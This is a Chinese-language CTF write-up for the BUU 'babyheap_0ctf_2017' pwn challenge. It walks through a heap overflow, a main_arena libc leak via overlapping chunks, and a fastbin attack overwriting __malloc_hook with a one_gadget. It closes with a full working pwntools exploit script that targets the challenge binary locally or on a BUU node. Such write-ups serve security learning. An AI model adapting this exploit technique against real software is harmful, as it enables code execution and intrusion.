---
title: BUU babyheap_0ctf_2017
description: BUU babyheap_0ctf_2017-writeup
date: 2021-07-04 15:07:56
categories:
 - PWN
tags:
---



# BUU babyheap_0ctf_2017

## IDA伪代码分析

首先检查一下文件

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625406140517-19f8adca-e6fc-4ae9-bff6-a8541ca831cf.png)

拖入IDA查看

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625406555881-dc0b3d5c-bdec-4706-a0f2-356a23d3b8de.png)

mmap了一段内存保存数据，跟做题没啥关系

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625406688110-b62ea770-2436-4bac-8193-bae289ec8334.png)

典型的菜单

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625406710430-03027b87-b5d3-4edc-8b6f-5efdabcf5b7e.png)

接收一个输入

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625406728103-040771cc-da44-4a4a-9ee5-d5e90422efe3.png)

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625406833431-c503b514-9274-41dd-80e6-0656c67da9ea.png)

Allocate的逻辑就是接收一个类似上图的结构，第一个1是判断是否已分配。这里讲一下calloc和malloc的区别，calloc不同于malloc，它会将分配的内存区域进行清零操作，这一点EXP里要注意，还有就是calloc就是malloc的一个封装，底层还是调用的malloc，这就对后面向__malloc_hook中打入one_gadget铺垫了基础。

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625407157041-1b3c2e1e-8460-49c7-8886-30875181b437.png)

接收一个指定大小size的内容，存在堆溢出

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625407176226-8e5849ec-30d3-46d0-aa15-608ba7f9dfc5.png)

free堆块，最后让指针等于0了，这就没有UAF了，可以从double free的思路入手。

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625407322247-71341742-b64e-4a27-a357-0a3c102afd6f.png)

打印函数，可以将堆块的内容打印出来

## 做题思路

可以利用double free，首先申请四个chunk

```python
alloc(0x80) #0
alloc(0x80) #1 
alloc(0x80) #2
alloc(0x80) #3
```

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625407805291-4bbce1ba-3649-4dd1-bc7c-ebc618887889.png)

free(1)将chunk1 free掉，然后通过堆溢出，修改chunk0的内容，将chunk1的size大小改成chunk1加chunk2的大小，0x121是由chunk1大小0x80和chunk2大小0x80，加上两个chunk的chunk头大小各0x10共0x20，加上prev_inuse位0x1，总共0x121，然后alloc(0x110)重新将chunk1分配回来，这样chunk1和chunk2就有重叠部分了，又因为calloc清零操作，需要通过堆溢出将chunk2的size大小改回去，然后将chunk2free掉，因为chunk2大小为0x80，free之后会进入unsorted bin，此时free chunk2的fd和bk指针指向main_arean+88的位置，然后通过dump(1)将chunk1打印，因为free chunk2也在chunk1的范围，这样就可以通过free chunk2的fd指针泄露出main_arean+88的地址

```python
free(1)
payload = 'a' * 0x88 + p64(0x121)
fill(0, payload)
alloc(0x110) #1
payload = 'a' * 0x88 + p64(0x91)
fill(1, payload)
free(2)
dump(1)
```

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625408015726-e953bf4a-80fc-438b-81a4-12523c0f0798.png)

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625408905348-1bc6cf14-10ed-41ca-af13-83bc6cb3f098.png)

为什么是main_aren+88，这是固定，我们可以通过调试看看

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625408927798-4926a33c-4313-49dc-bac6-b8d4e07b29a6.png)

此时main_arean+88为0x7f8a25985b78，那么main_arean的地址就减去88为0x7f8a25985b20，那我们看看main_arean-0x10是什么东西

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625409122442-713f4747-3d98-4dad-bc03-7cdab02ff94b.png)

发现是__malloc_hook的地址泄露出来了（这好像是固定main_arean-0x10的），这样我们就可以往里面打入one_gadget

```python
malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 88 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
log.success('libc_base==> {}'.format(hex(libc_base)))
```

之后的思路就是通过fastbin_attack，申请两个fastbin大小的chunk，不过首先要将chunk2申请回去，然后将chunk5 free掉，此时chunk5进入fast bin中，通过堆溢出，修改chunk4的内容，将chunk5的size大小改成0x71，反正在fastbin大小范围内就可以，然后将chunk5的fd指针改为__malloc_hook-0x23，为什么是__malloc_hook-0x23，我们等等通过调试看。

```python
alloc(0x80) #2
alloc(0x60) #4
alloc(0x60)	#5
free(5)
payload = 'a' * 0x68 + p64(0x71) + p64(malloc_hook-0x23)
fill(4, payload)
```

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625409806579-e1bb66f4-90ee-4bbf-b30b-cd606536ed54.png)

这里我们可以看到__malloc_hook-0x23有一个0x7f，是不是很熟悉，像不像chunk的结构中的size的大小，那0x7f是在fastbin的大小范围内，所以上面我们要构造fastbin大小范围内的chunk，那这样__malloc_hook-0x23就是一个伪造的fake free chunk，此时free chunk5指向了这个fake free chunk，那我们重新申请回chunk5，再申请一个chunk6，通过修改chunk6的内容，将__malloc_hook的内容改成one_gadget的地址，最后再随便申请一个堆块，这样就会调用malloc，从而触发one_gadget

```python
alloc(0x60) #5
alloc(0x60) #6

one_gadget = 0x4526a + libc_base
payload = 'a' * 0x13 + p64(one_gadget)
fill(6, payload)
alloc(0x10)
```

这里提一下libc是在BUU的资源里下载的，这题是Ubuntu16 64位的

![img](https://leung-1303067299.cos.ap-guangzhou.myqcloud.com/typora/1625410213820-e823d06c-b494-4c61-a968-f7ae050908a2.png)

## EXP

最后贴一下EXP

```python
from pwn import * 

# context.log_level = 'debug'

p = process('babyheap_0ctf_2017')
# p = remote('node4.buuoj.cn','27623')
libc = ELF('libc-2.23.so')

def alloc(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
 
def fill(idx, content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Size: ")
    p.sendline(str(len(content)))
    p.recvuntil("Content: ")
    p.send(content)
 
def free(idx):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(idx))
 
def dump(idx):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(idx))

alloc(0x80) #0
alloc(0x80) #1 
alloc(0x80) #2
alloc(0x80) #3
free(1)
payload = 'a' * 0x88 + p64(0x121)
fill(0, payload)
alloc(0x110) #1
payload = 'a' * 0x88 + p64(0x91)
fill(1, payload)
free(2)
dump(1)
pause()

malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 88 - 0x10
libc_base = malloc_hook - libc.sym['__malloc_hook']
log.success('libc_base==> {}'.format(hex(libc_base)))

alloc(0x80) #2
alloc(0x60) #4
alloc(0x60)	#5
free(5)
payload = 'a' * 0x68 + p64(0x71) + p64(malloc_hook-0x23)
fill(4, payload)
alloc(0x60) #5
alloc(0x60) #6

one_gadget = 0x4526a + libc_base
payload = 'a' * 0x13 + p64(one_gadget)
fill(6, payload)

alloc(0x10)

p.interactive()
```